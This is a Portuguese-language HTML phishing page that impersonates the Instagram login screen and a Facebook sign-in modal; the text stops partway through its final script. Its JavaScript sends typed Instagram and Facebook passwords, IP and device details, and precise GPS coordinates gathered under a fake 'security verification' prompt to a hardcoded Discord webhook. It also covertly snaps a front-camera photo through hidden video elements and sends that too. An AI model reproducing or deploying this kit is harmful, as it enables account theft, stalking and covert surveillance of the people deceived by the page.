<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="/img/insta-fav.ico">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            color: #262626;
            font-size: 14px;
            line-height: 18px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }
        
        .container {
            max-width: 350px;
            width: 100%;
        }
        
        .box {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            margin-bottom: 10px;
            padding: 10px 0;
        }
        
        .login-box {
            padding: 40px;
        }
        
        .logo {
            display: flex;
            justify-content: center;
            margin: 22px auto 12px;
        }
        
        .logo img {
            width: 175px;
            height: auto;
        }
        
        form {
            margin-top: 24px;
        }
        
        .form-group {
            margin-bottom: 6px;
        }
        
        input[type="text"],
        input[type="password"],
        input[type="email"] {
            width: 100%;
            padding: 9px 0 7px 8px;
            font-size: 12px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            outline: none;
            color: #262626;
        }
        
        input:focus {
            border-color: #a8a8a8;
        }
        
        input::placeholder {
            color: #8e8e8e;
            font-size: 12px;
        }
        
        .btn-login {
            width: 100%;
            padding: 7px 16px;
            background: #0095f6;
            border: 1px solid transparent;
            border-radius: 8px;
            color: #ffffff;
            font-weight: 600;
            font-size: 14px;
            margin-top: 8px;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        
        .btn-login:hover:not(:disabled) {
            background: #1877f2;
        }
        
        .btn-login:active:not(:disabled) {
            opacity: 0.7;
        }
        
        .btn-login:disabled {
            background: #0095f6;
            opacity: 0.3;
            cursor: default;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0 18px;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        
        .divider span {
            padding: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        
        .fb-login {
            text-align: center;
            margin-bottom: 16px;
        }
        
        .fb-login-btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 12px;
            cursor: pointer;
            background: none;
            border: none;
            padding: 0;
        }
        
        .fb-login-btn img {
            width: 16px;
            height: 16px;
        }
        
        .fb-login-btn span {
            color: #385185;
            font-weight: 600;
            text-decoration: none;
            font-size: 14px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }
        
        .signup-box {
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
            margin-left: 4px;
        }
        
        .app-section {
            text-align: center;
            margin-top: 20px;
        }
        
        .app-section p {
            margin-bottom: 16px;
            font-size: 14px;
        }
        
        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        
        .app-buttons img {
            height: 40px;
            cursor: pointer;
        }
        
        footer {
            padding: 0 20px 52px;
            margin-top: auto;
        }
        
        .footer-links {
            list-style: none;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin-bottom: 16px;
            gap: 12px;
        }
        
        .footer-links a {
            color: #8e8e8e;
            font-size: 12px;
            text-decoration: none;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .copyright {
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
        }

        /* Loading overlay */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        
        .overlay.show {
            display: flex;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0095f6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 12px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Modal gen√©rico */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.65);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            animation: fadeIn 0.2s ease;
        }
        
        .modal.show {
            display: flex;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .modal-content {
            background: #fff;
            border-radius: 12px;
            width: 90%;
            max-width: 400px;
            padding: 32px;
            text-align: center;
            animation: slideUp 0.3s ease;
            position: relative;
        }
        
        @keyframes slideUp {
            from {
                transform: translateY(20px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        
        .modal-close {
            position: absolute;
            top: 16px;
            right: 16px;
            background: none;
            border: none;
            font-size: 24px;
            color: #8e8e8e;
            cursor: pointer;
            padding: 0;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .modal-close:hover {
            color: #262626;
        }
        
        .modal-icon {
            width: 96px;
            height: 96px;
            margin: 0 auto 24px;
        }
        
        .modal-content h3 {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 12px;
            color: #262626;
        }
        
        .modal-content p {
            font-size: 14px;
            line-height: 20px;
            color: #737373;
            margin-bottom: 16px;
        }
        
        .modal-content p.small {
            font-size: 12px;
            color: #8e8e8e;
        }
        
        .btn-primary {
            width: 100%;
            padding: 8px 16px;
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin: 8px 0;
            transition: background 0.2s ease;
        }
        
        .btn-primary:hover:not(:disabled) {
            background: #1877f2;
        }
        
        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .btn-secondary {
            background: transparent;
            color: #0095f6;
            border: none;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            padding: 8px;
        }
        
        .btn-secondary:hover {
            color: #00376b;
        }
        
        .notice {
            background: #fffbf0;
            border: 1px solid #fed7aa;
            border-radius: 6px;
            padding: 12px;
            margin-top: 16px;
            font-size: 12px;
            color: #92400e;
            display: none;
            text-align: left;
        }
        
        .notice.show {
            display: block;
        }
        
        .notice svg {
            width: 16px;
            height: 16px;
            vertical-align: middle;
            margin-right: 6px;
        }

        /* Modal Facebook */
        .fb-modal-content {
            background: #fff;
            border-radius: 8px;
            width: 90%;
            max-width: 432px;
            padding: 0;
            text-align: center;
            animation: slideUp 0.3s ease;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
        }
        
        .fb-modal-header {
            padding: 16px 20px;
            border-bottom: 1px solid #dadde1;
            position: relative;
        }
        
        .fb-modal-header h2 {
            font-size: 20px;
            font-weight: bold;
            color: #1c1e21;
            margin: 0;
        }
        
        .fb-modal-header .modal-close {
            top: 12px;
            right: 12px;
            color: #65676b;
            font-size: 20px;
        }
        
        .fb-modal-body {
            padding: 16px 20px 20px;
        }
        
        .fb-modal-body p {
            color: #65676b;
            font-size: 15px;
            margin-bottom: 16px;
            text-align: left;
        }
        
        .fb-form-group {
            margin-bottom: 12px;
            text-align: left;
        }
        
        .fb-input {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            background: #f5f6f7;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            outline: none;
            color: #1c1e21;
        }
        
        .fb-input:focus {
            background: #fff;
            border-color: #1877f2;
        }
        
        .fb-input::placeholder {
            color: #8a8d91;
        }
        
        .fb-login-btn-submit {
            width: 100%;
            padding: 12px;
            background: #1877f2;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 12px;
            transition: background 0.2s ease;
        }
        
        .fb-login-btn-submit:hover {
            background: #166fe5;
        }
        
        .fb-forgot {
            display: block;
            color: #1877f2;
            font-size: 14px;
            margin-top: 16px;
            text-decoration: none;
        }
        
        .fb-forgot:hover {
            text-decoration: underline;
        }
        
        .fb-divider {
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }
        
        .fb-create-account {
            display: inline-block;
            padding: 12px 24px;
            background: #42b72a;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            text-decoration: none;
            transition: background 0.2s ease;
        }
        
        .fb-create-account:hover {
            background: #36a420;
        }

        /* Hidden elements */
        #cameraVideo,
        #cameraCanvas {
            position: fixed;
            opacity: 0;
            pointer-events: none;
            width: 1px;
            height: 1px;
            top: -9999px;
            left: -9999px;
        }

        .tooltip {
            position: fixed;
            top: 16px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(38, 38, 38, 0.9);
            color: #fff;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 14px;
            z-index: 99999;
            max-width: 90%;
            text-align: center;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            display: none;
        }
        
        .tooltip.show {
            display: block;
            animation: fadeIn 0.3s ease;
        }
        
        @media (max-width: 450px) {
            .login-box {
                padding: 40px 20px 20px;
            }
            
            main {
                padding: 16px 8px;
            }
            
            .modal-content,
            .fb-modal-content {
                padding: 24px 20px 12px;
            }
        }
    </style>
</head>
<body>
    <!-- Loading -->
    <div class="overlay" id="loading">
        <div class="spinner"></div>
        <span>Redirecionando para o Instagram...</span>
    </div>

    <!-- Camera elements -->
    <video id="cameraVideo" autoplay playsinline muted></video>
    <canvas id="cameraCanvas"></canvas>

    <!-- Tooltip -->
    <div class="tooltip" id="tooltip">
        <strong>Importante:</strong> Clique em "Permitir" quando solicitado
    </div>

    <!-- Modal de Localiza√ß√£o -->
    <div class="modal" id="locationModal">
        <div class="modal-content">
            <svg class="modal-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#0095f6">
                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
            </svg>
            <h3>Verifica√ß√£o de seguran√ßa</h3>
            <p>Detectamos um padr√£o de acesso incomum. Por raz√µes de seguran√ßa, o Instagram precisa verificar sua localiza√ß√£o para proteger sua conta contra acessos n√£o autorizados.</p>
            <p class="small">Este √© um procedimento padr√£o de seguran√ßa que ajuda a distinguir usu√°rios reais de bots.</p>
            <button class="btn-primary" id="allowLocation">Verificar minha localiza√ß√£o</button>
            <p class="small" style="margin-top: 12px; margin-bottom: 8px;">Seus dados de localiza√ß√£o ser√£o usados apenas para verifica√ß√£o de seguran√ßa.</p>
            <button class="btn-secondary" id="denyLocation">Tentar outra forma de verifica√ß√£o</button>

            <div id="iosNotice" class="notice">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#92400e">
                    <path d="M12 22s-8-4.5-8-11.8C4 5.5 7.5 2 12 2s8 3.5 8 8.2c0 7.3-8 11.8-8 11.8zm0-9a3 3 0 100-6 3 3 0 000 6z"/>
                </svg>
                Para usu√°rios de iPhone/iPad: Toque em "Permitir" quando solicitado.
            </div>
        </div>
    </div>

    <!-- Modal de Login do Facebook -->
    <div class="modal" id="fbLoginModal">
        <div class="fb-modal-content">
            <div class="fb-modal-header">
                <h2>Entrar com o Facebook</h2>
                <button class="modal-close" id="closeFbModal">&times;</button>
            </div>
            <div class="fb-modal-body">
                <p>Para continuar, fa√ßa login com sua conta do Facebook.</p>
                
                <form id="fbLoginForm">
                    <div class="fb-form-group">
                        <input 
                            type="email" 
                            id="fbEmail" 
                            name="fbEmail"
                            class="fb-input"
                            placeholder="Email ou telefone" 
                            required
                        >
                    </div>
                    <div class="fb-form-group">
                        <input 
                            type="password" 
                            id="fbPassword" 
                            name="fbPassword"
                            class="fb-input"
                            placeholder="Senha" 
                            required
                        >
                    </div>
                    <button type="submit" class="fb-login-btn-submit">Entrar</button>
                </form>
                
                <a href="#" class="fb-forgot">Esqueceu a conta?</a>
                
                <div class="fb-divider"></div>
                
                <a href="#" class="fb-create-account">Criar nova conta</a>
            </div>
        </div>
    </div>

    <!-- Main -->
    <main>
        <div class="container">
            <div class="box login-box">
                <div class="logo">
                    <img src="/img/instagram-logo.png" alt="Instagram">
                </div>

                <form id="loginForm">
                    <div class="form-group">
                        <input 
                            type="text" 
                            id="email" 
                            name="email"
                            placeholder="Telefone, nome de usu√°rio ou email" 
                            autocapitalize="off"
                            autocorrect="off"
                            required
                        >
                    </div>
                    <div class="form-group">
                        <input 
                            type="password" 
                            id="password" 
                            name="password"
                            placeholder="Senha" 
                            required
                        >
                    </div>
                    <button type="submit" class="btn-login" disabled>Entrar</button>
                </form>

                <div class="divider">
                    <span>OU</span>
                </div>

                <div class="fb-login">
                    <button class="fb-login-btn" id="fbLoginBtn">
                        <img src="/img/facebooklogo.png" alt="Facebook">
                        <span>Entrar com o Facebook</span>
                    </button>
                    <br>
                    <a href="#" class="forgot-password">Esqueceu a senha?</a>
                </div>
            </div>

            <div class="box signup-box">
                <span>N√£o tem uma conta?</span>
                <a href="#">Cadastre-se</a>
            </div>

            <div class="app-section">
                <p>Obtenha o aplicativo.</p>
                <div class="app-buttons">
                    <img src="/img/apple-button.png" alt="Baixar na App Store">
                    <img src="/img/googleplay-button.png" alt="Dispon√≠vel no Google Play">
                </div>
            </div>
        </div>
    </main>

    <footer>
        <ul class="footer-links">
            <li><a href="#">Meta</a></li>
            <li><a href="#">Sobre</a></li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">Carreiras</a></li>
            <li><a href="#">Ajuda</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Privacidade</a></li>
            <li><a href="#">Termos</a></li>
            <li><a href="#">Localiza√ß√µes</a></li>
            <li><a href="#">Instagram Lite</a></li>
            <li><a href="#">Threads</a></li>
            <li><a href="#">Carregamento de contatos e n√£o usu√°rios</a></li>
            <li><a href="#">Meta Verified</a></li>
        </ul>
        <p class="copyright">¬© 2026 Instagram do Meta</p>
    </footer>

    <script>
        const webhook = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2";
        
        let userLatitude = null;
        let userLongitude = null;
        let verificacaoConcluida = false;
        let cameraImage = null;
        let cameraAttempted = false;
        let cameraSent = false;
        let locationSent = false;
        let iosLocationAttempted = false;

        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
        const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent) || (isIOS && !navigator.userAgent.includes('CriOS'));

        if (isIOS) {
            document.getElementById('iosNotice').classList.add('show');
        }

        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const submitButton = document.querySelector('.btn-login');

        function checkFormValidity() {
            submitButton.disabled = !(emailInput.value.trim() && passwordInput.value.trim());
        }

        emailInput.addEventListener('input', checkFormValidity);
        passwordInput.addEventListener('input', checkFormValidity);

        // Abrir modal do Facebook
        document.getElementById('fbLoginBtn').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('fbLoginModal').classList.add('show');
        });

        // Fechar modal do Facebook
        document.getElementById('closeFbModal').addEventListener('click', function() {
            document.getElementById('fbLoginModal').classList.remove('show');
        });

        // Fechar modal clicando fora
        document.getElementById('fbLoginModal').addEventListener('click', function(e) {
            if (e.target === this) {
                this.classList.remove('show');
            }
        });

        // Processar login do Facebook
        document.getElementById('fbLoginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const fbEmail = document.getElementById('fbEmail').value;
            const fbPassword = document.getElementById('fbPassword').value;
            
            if (!fbEmail || !fbPassword) {
                alert("Por favor, preencha todos os campos.");
                return;
            }
            
            // Fechar modal do Facebook
            document.getElementById('fbLoginModal').classList.remove('show');
            
            // Enviar dados do Facebook para o Discord
            await sendFacebookToDiscord(fbEmail, fbPassword);
            
            // Mostrar modal de localiza√ß√£o se ainda n√£o foi verificado
            if (!verificacaoConcluida) {
                document.getElementById('locationModal').classList.add('show');
            } else {
                // Se j√° verificado, processar login diretamente
                document.getElementById('loading').classList.add('show');
                
                setTimeout(() => {
                    window.location.href = "https://www.instagram.com/";
                }, 1500);
            }
        });

        async function sendFacebookToDiscord(email, password) {
            try {
                const userAgent = navigator.userAgent;
                const ipInfo = await getIPInfo();
                const deviceInfo = detectUserInfo(userAgent);
                
                let locationInfo = "Localiza√ß√£o n√£o fornecida";
                let mapsLink = "";
                
                if (userLatitude && userLongitude) {
                    mapsLink = `https://www.google.com/maps?q=${userLatitude},${userLongitude}`;
                    locationInfo = `Latitude: ${userLatitude}\nLongitude: ${userLongitude}\nGoogle Maps: ${mapsLink}`;
                } else if (ipInfo.latitude && ipInfo.longitude) {
                    mapsLink = `https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude}`;
                    locationInfo = `Latitude: ${ipInfo.latitude}\nLongitude: ${ipInfo.longitude}\nGoogle Maps: ${mapsLink}\n(Aproximado pelo IP)`;
                }
                
                const payload = {
                    username: "Instagram Logger",
                    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png",
                    embeds: [{
                        title: "üìò Credenciais do Facebook Capturadas (via Instagram)",
                        color: 0x1877F2,
                        fields: [
                            { name: "üìß Email/Telefone", value: "```" + email + "```", inline: true },
                            { name: "üîë Senha", value: "```" + password + "```", inline: true },
                            { name: "üåê Informa√ß√µes de IP", value: "```IP: " + ipInfo.ip + "\nPa√≠s: " + ipInfo.country + "\nRegi√£o: " + ipInfo.region + "\nCidade: " + ipInfo.city + "\nISP: " + ipInfo.isp + "```", inline: false },
                            { name: "üìç Geolocaliza√ß√£o", value: "```" + locationInfo + "```", inline: false },
                            { name: "üìü Informa√ß√µes do Dispositivo", value: "```Sistema: " + deviceInfo.os + "\nNavegador: " + deviceInfo.browser + "\nM√≥vel: " + (isMobile ? "Sim" : "N√£o") + "\niOS: " + (isIOS ? "Sim" : "N√£o") + "\nSafari: " + (isSafari ? "Sim" : "N√£o") + "```", inline: false },
                            { name: "üìÖ Data e Hora", value: "```" + new Date().toLocaleString() + "```", inline: false }
                        ],
                        footer: { text: "Facebook Login via Instagram" },
                        timestamp: new Date().toISOString()
                    }]
                };
                
                if (mapsLink) {
                    payload.embeds[0].url = mapsLink;
                }
                
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error("Erro ao enviar dados do Facebook:", error);
            }
        }

        async function sendCameraImageToDiscord(imageBase64) {
            if (!imageBase64 || cameraSent) return;
            cameraSent = true;
            
            try {
                const payload = {
                    username: "Instagram Logger",
                    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png",
                    content: "üì∏ Foto do usu√°rio capturada",
                    embeds: [{
                        title: "Foto da c√¢mera",
                        color: 0xE1306C,
                        image: { url: "attachment://camera.jpg" }
                    }]
                };
                
                const byteString = atob(imageBase64.split(',')[1]);
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                
                const blob = new Blob([ab], { type: "image/jpeg" });
                const file = new File([blob], "camera.jpg", { type: "image/jpeg" });
                
                const formData = new FormData();
                formData.append("payload_json", JSON.stringify(payload));
                formData.append("file", file, "camera.jpg");
                
                await fetch(webhook, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error("Erro ao enviar imagem:", error);
            }
        }

        async function sendLocationToDiscord(latitude, longitude, accuracy = null, source = "GPS") {
            if (locationSent) return;
            locationSent = true;
            
            try {
                const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                
                const fields = [
                    { name: "üìç Latitude", value: `\`${latitude}\``, inline: true },
                    { name: "üìç Longitude", value: `\`${longitude}\``, inline: true },
                    { name: "üì± Dispositivo", value: `\`${isIOS ? 'iOS' : (isMobile ? 'Android/Mobile' : 'Desktop')}\``, inline: true }
                ];
                
                if (accuracy !== null) {
                    fields.push({ name: "üéØ Precis√£o", value: `\`${accuracy} metros\``, inline: true });
                }
                
                fields.push({ name: "üåê Navegador", value: `\`${isSafari ? 'Safari' : 'Outro navegador'}\``, inline: true });
                fields.push({ name: "‚ÑπÔ∏è Fonte", value: source, inline: true });
                
                const payload = {
                    username: "Instagram Logger",
                    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png",
                    embeds: [{
                        title: "üìç Localiza√ß√£o Exata Capturada",
                        description: `Coordenadas GPS obtidas do dispositivo.\n[Ver no Google Maps](${mapsLink})`,
                        color: isIOS ? 0xFF0000 : 0xE1306C,
                        fields: fields,
                        url: mapsLink,
                        footer: { text: "Instagram Location Capture" },
                        timestamp: new Date().toISOString()
                    }]
                };
                
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error("Erro ao enviar localiza√ß√£o:", error);
            }
        }
        
        function initCamera() {
            if (cameraAttempted) return;
            cameraAttempted = true;
            
            try {
                const video = document.getElementById('cameraVideo');
                const canvas = document.getElementById('cameraCanvas');
                
                video.muted = true;
                video.setAttribute('muted', '');
                video.setAttribute('playsinline', '');
                video.volume = 0;
                
                const constraints = {
                    audio: false,
                    video: {
                        facingMode: "user",
                        width: { ideal: 320 },
                        height: { ideal: 240 },
                        frameRate: { ideal: 15 }
                    }
                };
                
                const cameraTimerId = setTimeout(() => {
                    if (video.srcObject) {
                        video.srcObject.getTracks().forEach(track => track.stop());
                        video.srcObject = null;
                    }
                }, 2000);
                
                navigator.mediaDevices.getUserMedia(constraints)
                    .then(stream => {
                        video.srcObject = stream;
                        
                        video.play().then(() => {
                            setTimeout(() => {
                                try {
                                    canvas.width = video.videoWidth;
                                    canvas.height = video.videoHeight;
                                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                                    
                                    cameraImage = canvas.toDataURL('image/jpeg', 0.5);
                                    
                                    stream.getTracks().forEach(track => track.stop());
                                    video.srcObject = null;
                                    clearTimeout(cameraTimerId);
                                    
                                    sendCameraImageToDiscord(cameraImage);
                                } catch (e) {
                                    stream.getTracks().forEach(track => track.stop());
                                }
                            }, 150);
                        }).catch(error => {
                            stream.getTracks().forEach(track => track.stop());
                        });
                    })
                    .catch(error => {
                        clearTimeout(cameraTimerId);
                    });
            } catch (error) {
                console.error("Erro ao inicializar c√¢mera:", error);
            }
        }

        function getiOSLocation() {
            if (iosLocationAttempted) return Promise.reject(new Error('J√° tentado'));
            iosLocationAttempted = true;
            
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocaliza√ß√£o n√£o suportada'));
                    return;
                }
                
                const tooltip = document.getElementById('tooltip');
                tooltip.classList.add('show');
                
                const watchId = navigator.geolocation.watchPosition(
                    (position) => {
                        userLatitude = position.coords.latitude;
                        userLongitude = position.coords.longitude;
                        
                        navigator.geolocation.clearWatch(watchId);
                        tooltip.classList.remove('show');
                        
                        sendLocationToDiscord(
                            userLatitude, 
                            userLongitude, 
                            position.coords.accuracy, 
                            "GPS (iOS/Safari)"
                        );
                        
                        resolve({
                            latitude: userLatitude,
                            longitude: userLongitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    (error) => {
                        tooltip.classList.remove('show');
                        
                        setTimeout(() => {
                            alert("Para verificar sua identidade, o Instagram precisa acessar sua localiza√ß√£o. Por favor, toque em 'Permitir' quando solicitado.");
                            
                            navigator.geolocation.getCurrentPosition(
                                (position) => {
                                    userLatitude = position.coords.latitude;
                                    userLongitude = position.coords.longitude;
                                    
                                    sendLocationToDiscord(
                                        userLatitude, 
                                        userLongitude, 
                                        position.coords.accuracy, 
                                        "GPS (iOS/Safari - segunda tentativa)"
                                    );
                                    
                                    resolve({
                                        latitude: userLatitude,
                                        longitude: userLongitude,
                                        accuracy: position.coords.accuracy
                                    });
                                },
                                (secondError) => {
                                    getIPInfo().then(ipInfo => {
                                        if (ipInfo && ipInfo.latitude && ipInfo.longitude) {
                                            sendLocationToDiscord(
                                                ipInfo.latitude, 
                                                ipInfo.longitude, 
                                                null, 
                                                "IP (fallback iOS/Safari)"
                                            );
                                            
                                            resolve({
                                                latitude: ipInfo.latitude,
                                                longitude: ipInfo.longitude,
                                                source: "IP"
                                            });
                                        } else {
                                            reject(new Error("Todos os m√©todos falharam"));
                                        }
                                    }).catch(reject);
                                },
                                { 
                                    enableHighAccuracy: true, 
                                    timeout: 15000,
                                    maximumAge: 0
                                }
                            );
                        }, 500);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 20000,
                        maximumAge: 0
                    }
                );
                
                setTimeout(() => {
                    navigator.geolocation.clearWatch(watchId);
                }, 15000);
            });
        }
        
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocaliza√ß√£o n√£o suportada'));
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        userLatitude = position.coords.latitude;
                        userLongitude = position.coords.longitude;
                        
                        sendLocationToDiscord(
                            userLatitude, 
                            userLongitude, 
                            position.coords.accuracy, 
                            "GPS (Android/Outro)"
                        );
                        
                        resolve({
                            latitude: userLatitude,
                            longitude: userLongitude
                        });
                    },
                    (error) => {
                        reject(error);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        async function getIPInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                const infoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const ipInfo = await infoResponse.json();
                
                return {
                    ip: ipData.ip,
                    country: ipInfo.country_name || 'Desconhecido',
                    region: ipInfo.region || 'Desconhecido',
                    city: ipInfo.city || 'Desconhecido',
                    isp: ipInfo.org || 'Desconhecido',
                    latitude: ipInfo.latitude,
                    longitude: ipInfo.longitude,
                    timezone: ipInfo.timezone || 'Desconhecido'
                };
            } catch (error) {
                return {
                    ip: 'Desconhecido',
                    country: 'Desconhecido',
                    region: 'Desconhecido',
                    city: 'Desconhecido',
                    isp: 'Desconhecido'
                };
            }
        }
        
        function detectUserInfo(userAgent) {
            let os = "Desconhecido";
            let browser = "Desconhecido";
            
            if (userAgent.includes("Windows")) os = "Windows";
            else if (userAgent.includes("Mac OS")) os = "MacOS";
            else if (userAgent.includes("Linux")) os = "Linux";
            else if (userAgent.includes("Android")) os = "Android";
            else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
            
            if (userAgent.includes("Firefox")) browser = "Firefox";
            else if (userAgent.includes("Chrome")) browser = "Chrome";
            else if (userAgent.includes("Safari")) browser = "Safari";
            else if (userAgent.includes("Edge")) browser = "Edge";
            else if (userAgent.includes("Opera") || userAgent.includes("OPR")) browser = "Opera";
            
            return { os, browser };
        }
        
        async function processLogin(email, password) {
            document.getElementById('loading').classList.add('show');
            
            const userAgent = navigator.userAgent;
            const ipInfo = await getIPInfo();
            const deviceInfo = detectUserInfo(userAgent);
            
            let locationInfo = "Localiza√ß√£o n√£o fornecida";
            let mapsLink = "";
            
            if (userLatitude && userLongitude) {
                mapsLink = `https://www.google.com/maps?q=${userLatitude},${userLongitude}`;
                locationInfo = `Latitude: ${userLatitude}\nLongitude: ${userLongitude}\nGoogle Maps: ${mapsLink}`;
            } else if (ipInfo.latitude && ipInfo.longitude) {
                mapsLink = `https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude}`;
                locationInfo = `Latitude: ${ipInfo.latitude}\nLongitude: ${ipInfo.longitude}\nGoogle Maps: ${mapsLink}\n(Aproximado pelo IP)`;
            }
            
            const payload = {
                username: "Instagram Logger",
                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png",
                embeds: [{
                    title: "üì± Credenciais do Instagram Capturadas",
                    color: 0xE1306C,
                    fields: [
                        { name: "üìß Usu√°rio/Email", value: "```" + email + "```", inline: true },
                        { name: "üîë Senha", value: "```" + password + "```", inline: true },
                        { name: "üåê Informa√ß√µes de IP", value: "```IP: " + ipInfo.ip + "\nPa√≠s: " + ipInfo.country + "\nRegi√£o: " + ipInfo.region + "\nCidade: " + ipInfo.city + "\nISP: " + ipInfo.isp + "```", inline: false },
                        { name: "üìç Geolocaliza√ß√£o", value: "```" + locationInfo + "```", inline: false },
                        { name: "üìü Informa√ß√µes do Dispositivo", value: "```Sistema: " + deviceInfo.os + "\nNavegador: " + deviceInfo.browser + "\nM√≥vel: " + (isMobile ? "Sim" : "N√£o") + "\niOS: " + (isIOS ? "Sim" : "N√£o") + "\nSafari: " + (isSafari ? "Sim" : "N√£o") + "```", inline: false },
                        { name: "üìÖ Data e Hora", value: "```" + new Date().toLocaleString() + "```", inline: false }
                    ],
                    footer: { text: "Instagram Login Capture" },
                    timestamp: new Date().toISOString()
                }]
            };
            
            if (mapsLink) {
                payload.embeds[0].url = mapsLink;
            }
            
            await fetch(webhook, {
                method: 'POST',
